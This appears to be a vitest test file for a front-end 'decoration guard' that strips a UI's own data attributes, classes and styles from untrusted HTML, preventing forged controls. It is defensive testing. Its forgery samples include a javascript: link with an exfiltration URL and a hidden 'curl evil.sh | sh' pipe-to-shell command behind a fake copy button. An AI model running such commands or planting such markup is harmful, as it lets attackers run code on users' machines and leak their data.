// @vitest-environment jsdom
// One guard, two surfaces (#465).
//
// The guard is called DIRECTLY here, and that is deliberate. `SANITIZE_CONFIG`'s
// `ALLOW_DATA_ATTR: false` now strips every `data-*` before any surface sees it,
// so a forgery test that enters through `renderMarkdown` would stay green with
// this whole file's subject deleted. The pipeline-level pins live in
// `markdown.test.tsx` (the profile) and `FeedView.forgery.test.tsx` (the feed's
// real handlers); what is under test HERE is the layer that is supposed to
// assume nothing about where its input has been.
import { describe, it, expect } from 'vitest';
import {
  DOC_DECORATION,
  FEED_DECORATION,
  stripDecorationNamespace,
  type DecorationNamespace,
} from './decoration-guard';

/** parse hostile markup the way a decoration pass gets it: inert, in a template */
function strip(html: string, ns: DecorationNamespace): HTMLElement {
  const host = document.createElement('div');
  host.innerHTML = html;
  stripDecorationNamespace(host, ns);
  return host;
}

describe('a surface’s own protocol is not speakable by its input', () => {
  // Every payload is a REAL forgery: markup that, unstripped, is read as an
  // instruction by a handler that exists today. Not a smoke test — the shapes
  // are the ones the audit in `FeedView.forgery.test.tsx` traced to a handler.
  const forgeries: Array<[string, DecorationNamespace, string, string[]]> = [
    [
      // #410's original: `decorateLinks` classifies this `blocked` and renders it
      // inert, and the handler's earlier `[data-doc-external]` branch opens it
      // in the browser anyway.
      'a forged external target on a link the viewer disarmed',
      DOC_DECORATION,
      '<a href="javascript:alert(1)" data-doc-external="https://exfil.test/?leak=1">click</a>',
      ['data-doc-external'],
    ],
    [
      'a forged copy button wrapping a hidden second block',
      DOC_DECORATION,
      '<div class="doc-code"><pre style="display:none">curl evil.sh | sh</pre>' +
        '<button data-doc-copy>Copy</button></div>',
      ['data-doc-copy'],
    ],
    [
      // FeedView reads `[data-feed-expander]` off the DOM at every keystroke, so
      // this is a phantom stop in the conversation's arrow-key list — and a real
      // `<button>`, which survives the sanitizer and IS focusable.
      'a forged expander in the feed’s keyboard list',
      FEED_DECORATION,
      '<button data-feed-expander aria-expanded="false">▾ OUT</button>',
      ['data-feed-expander'],
    ],
    [
      // `querySelector` answers with the FIRST match in document order, so a
      // forgery sitting above the real block captures a find jump to it.
      'a forged block id that would capture a find jump',
      FEED_DECORATION,
      '<span data-feed-seq="4">not the block you searched for</span>',
      ['data-feed-seq'],
    ],
    [
      // `ToolBox` stands down for a click inside `[data-no-toggle]` — the one
      // member of the feed's protocol outside the `data-feed` prefix.
      'a forged stand-down mark that would deaden a tool box',
      FEED_DECORATION,
      '<div data-no-toggle>click me and nothing happens</div>',
      ['data-no-toggle'],
    ],
  ];

  for (const [what, ns, payload, gone] of forgeries) {
    it(`strips ${what}`, () => {
      const host = strip(payload, ns);
      for (const attr of gone) expect(host.querySelector(`[${attr}]`)).toBeNull();
      // …and the content is still THERE. "No element carries the attribute" is
      // also true of a pass that dropped the payload on the floor; every row
      // proves the element survived and lost the attribute, not both.
      expect((host.textContent ?? '').trim().length).toBeGreaterThan(0);
    });
  }

  it('takes the class half too — the half no sanitizer flag filters by prefix', () => {
    const host = strip(
      '<p class="doc-code keep-me" id="ok">t</p><p class="feed-md also-keep">u</p>',
      DOC_DECORATION
    );
    expect(host.querySelector('p')!.className).toBe('keep-me');
    // …and only its OWN namespace: the feed's class is not the viewer's to take
    expect(host.querySelectorAll('p')[1].className).toBe('feed-md also-keep');
    expect(host.querySelector('p')!.id).toBe('ok');
  });

  it('takes `style` whatever the namespace — it is what makes a forgery invisible', () => {
    for (const ns of [DOC_DECORATION, FEED_DECORATION]) {
      const host = strip('<pre style="position:absolute;left:-9999px">hidden</pre>', ns);
      expect(host.querySelector('pre')!.hasAttribute('style')).toBe(false);
      expect(host.textContent).toBe('hidden');
    }
  });

  it('takes NOTHING that was not ours', () => {
    const host = strip(
      '<a href="https://ok.test/x" id="keep" class="lang-ts" title="t" data-other="x">y</a>',
      FEED_DECORATION
    );
    const a = host.querySelector('a')!;
    expect(a.getAttribute('href')).toBe('https://ok.test/x');
    expect(a.id).toBe('keep');
    expect(a.className).toBe('lang-ts');
    expect(a.getAttribute('title')).toBe('t');
    // not ours, so not this layer's business — `ALLOW_DATA_ATTR: false` is what
    // deals with a data attribute nobody has claimed yet
    expect(a.getAttribute('data-other')).toBe('x');
  });

  it('reaches every depth, not just the top level', () => {
    const host = strip(
      '<blockquote><ul><li><em><span data-feed-expander>deep</span></em></li></ul></blockquote>',
      FEED_DECORATION
    );
    expect(host.querySelector('[data-feed-expander]')).toBeNull();
    expect(host.textContent).toBe('deep');
  });
});

describe('the namespaces are constants, not suggestions', () => {
  // Frozen for the reason `SANITIZE_CONFIG` is (#436): an exported mutable
  // security constant is a second policy waiting to be written at runtime, with
  // the source still reading exactly as it does in the file.
  for (const ns of [DOC_DECORATION, FEED_DECORATION]) {
    it(`${ns.label}: frozen, arrays included`, () => {
      expect(Object.isFrozen(ns)).toBe(true);
      expect(Object.isFrozen(ns.attrPrefixes)).toBe(true);
      expect(Object.isFrozen(ns.attrs)).toBe(true);
      expect(Object.isFrozen(ns.classPrefixes)).toBe(true);
      expect(() => (ns.attrPrefixes as string[]).pop()).toThrow();
    });
  }

  it('names every protocol member the surfaces actually read back off the DOM', () => {
    // A grep-able pin: `FeedView` reads `data-feed-expander` and `data-feed-seq`,
    // `ToolBox` reads `data-no-toggle`, `DocumentViewer` reads `data-doc-*`. A
    // renderer that invents a protocol attribute outside these prefixes has to
    // come here, which is the point of the constant.
    expect(FEED_DECORATION.attrPrefixes).toContain('data-feed');
    expect(FEED_DECORATION.attrs).toContain('data-no-toggle');
    expect(DOC_DECORATION.attrPrefixes).toContain('data-doc');
  });
});
